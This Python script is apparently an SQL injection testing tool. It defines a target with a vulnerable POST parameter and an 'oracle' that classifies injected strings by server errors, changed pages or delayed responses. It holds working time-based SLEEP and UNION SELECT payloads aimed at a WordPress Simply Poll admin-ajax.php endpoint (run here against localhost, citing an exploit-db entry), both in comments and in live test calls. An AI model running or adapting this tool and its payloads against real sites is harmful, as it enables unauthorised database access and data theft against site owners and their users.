#coding:utf-8
import requests
import copy
import time

The_target = None 

## Model
def get_default_average_time(target, nb):
    """get average time for wrong requests"""
    som = 0
    for i in range(nb):        
        start = time.clock()
        post_request(target, chr((10000+i)%55295)+chr((20000+i)%55295))
        stop = time.clock()
        som += (stop - start)
    return som/nb

def post_request(target, injtxt): 
    """send a post request to the target with a supplement to the vulnerable param and return server response"""
    injected_target = copy.deepcopy(target)
    injected_target.payload[target.param] = target.payload[target.param] + injtxt
    r = requests.post(injected_target.url, data=injected_target.payload)    
    return r    

class HttpTarget:
    """describe a target with an url, a default payload and the vulnerable param"""
    def __init__(self, url, payload, param, nb=10):
        self.url = url
        self.payload = payload        
        self.param = param
        self.defaultPage = post_request(self, '').text
        self.avgTime = get_default_average_time(self, nb)
    def update_avgTime(self, nb=5):
        self.avgTime = get_default_average_time(self, nb)

## Main functions
def init(url, payload, param, nb=10):
    """define the target"""
    global The_target 
    The_target = HttpTarget(url, payload, param, nb)
    print("target locked at :", The_target.url) 
    print("       measured average response time :", round(The_target.avgTime,2),"s")


def oracle(injtxt):
    """return 0 only if injtxt is syntactically valid"""
    if The_target == None:
        print("the target is sadly not defined (。_。)")
        print("try: python sqloracl.py init ([url](string), [payload](dict), [param](string), optional [avgnb](int))") 
    else:        
        start = time.clock()
        r = post_request(The_target, injtxt)
        stop = time.clock()
        delay = (stop - start)     
        if r.text.find("error")>= 0:    
            print("target raised error ┗( T﹏T )┛")
            return 1 # invalid
        elif r.text != The_target.defaultPage:
            print("target sent a different response to the default one 🍾(ﾟヮﾟ☜)")
            return 0 # valid        
        elif delay>The_target.avgTime*3:
            The_target.update_avgTime(3) #update avg response time
            if delay>The_target.avgTime*3:   
                print("target was very slow to answer (✿◡‿◡)")         
                return 0 # valid
        else:
            print("oracle was not able to determine if \""+injtxt+"\" was undoubtedly invalid ¯\(°_o)/¯") 
            return 0 # default
    
 
## Tests
# Targets
#https://www.exploit-db.com/exploits/40971
#simply_poll = HttpTarget("http://localhost/injections/wordp/wp-admin/admin-ajax.php",
                         #{'action': 'spAjaxResults', 'pollid': '2'},
                         #"pollid")   

# post_request 
# ## wrong post
#print(post_request(simply_poll, chr(156)).text)
# ## injection SQL (sleep 5s)
#print(post_request(simply_poll, ' AND (SELECT 1158 FROM (SELECT(SLEEP(5)))eipW)').text)
# ## injection SQL (CONCAT)
#print(post_request(simply_poll, ' UNION ALL SELECT 6050,6050,6050,6050,6050,CONCAT(0x71786a7171,0x574f546a6e7944764f597450476f724d73677867664f754967476f59636c5054705a4c7853736143,0x7170767871),6050--').text)

# get_default_average_time
#print(get_default_average_time(simply_poll, 10))

oracle("toto")
init("http://localhost/injections/wordp/wp-admin/admin-ajax.php",
     {'action': 'spAjaxResults', 'pollid': '2'},
     "pollid")
print("[test] ↓ invalid: return 1")
print(oracle("toto"))
print(oracle(chr(156)))
print(oracle(" AND SLEEP(5)"))
print("[test] ↓ valid: return 0")
print(oracle(""))
print(oracle(" AND (SELECT 1158 FROM (SELECT(SLEEP(5)))eipW)"))
print(oracle(" UNION ALL SELECT 6050,6050,6050,6050,6050,CONCAT(0x71786a7171,0x574f546a6e7944764f597450476f724d73677867664f754967476f59636c5054705a4c7853736143,0x7170767871),6050--"))

